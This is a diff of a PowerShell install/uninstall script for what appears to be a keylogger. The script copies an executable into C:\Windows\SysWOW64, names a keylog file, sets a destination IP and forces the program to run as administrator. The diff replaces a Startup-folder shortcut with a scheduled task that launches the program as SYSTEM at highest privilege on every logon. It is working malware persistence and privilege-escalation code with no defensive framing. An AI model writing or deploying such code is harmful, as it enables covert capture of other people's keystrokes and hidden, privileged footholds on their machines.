@@ -5,7 +5,6 @@ $DestDir = "C:\Windows\SysWOW64\"
 $DestIp = "***REMOVED***"
 $KeyLogName = "k"
 $InstallPath = "$DestDir$AppExe"
-$ShortcutPath = "C:\Users\Mark\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\service.lnk"
 $AppCompatFlagsLayers = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers"
 
 $Machine = [Environment]::MachineName
@@ -27,15 +26,16 @@ function Install()
             # Install
             Copy-Item -Path "$BaseDir$AppExe" -Destination $DestDir -ErrorAction Stop 2>&1 >> $LogFile
             
-            # Create shortcut
-            $objShell = New-Object -ComObject ("WScript.Shell")
-            $objShortCut = $objShell.CreateShortcut($ShortcutPath)
-            $objShortCut.TargetPath = $InstallPath
-            $objShortCut.Save()
-            "Created shortcut at $ShortcutPath" | Out-File -Append -FilePath $LogFile
-
             # Always run application as admin
             New-ItemProperty -Path $AppCompatFlagsLayers -Name $InstallPath -Value "~ RUNASADMIN" -PropertyType String -Force | Out-File -Append -FilePath $LogFile
+
+            # Create task in task scheduler
+            $action = New-ScheduledTaskAction -Execute $InstallPath
+            $trigger = New-ScheduledTaskTrigger -AtLogOn
+            $principle = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
+            $settings = New-ScheduledTaskSettingsSet -DontStopIfGoingOnBatteries
+            $task = New-ScheduledTask -Action $action -Principal $principle -Trigger $trigger -Settings $settings
+            Register-ScheduledTask $App -InputObject $task
             
             # Start application
             Start-Process -FilePath $InstallPath | Out-File -Append -FilePath $LogFile
@@ -54,8 +54,8 @@ function Uninstall()
     Stop-Process -Name $App -Force
     Remove-Item -Force "$DestDir$KeyLogName"
     Remove-Item $InstallPath | Out-File -Append -FilePath $LogFile
-    Remove-Item $ShortcutPath | Out-File -Append -FilePath $LogFile
     Remove-ItemProperty -Path $AppCompatFlagsLayers -Name $InstallPath -Force | Out-File -Append -FilePath $LogFile
+    Unregister-ScheduledTask -TaskName $App -Confirm:$false | Out-File -Append -FilePath $LogFile
     "Uninstalled $InstallPath" | Out-File -Append -FilePath $LogFile
 }
 
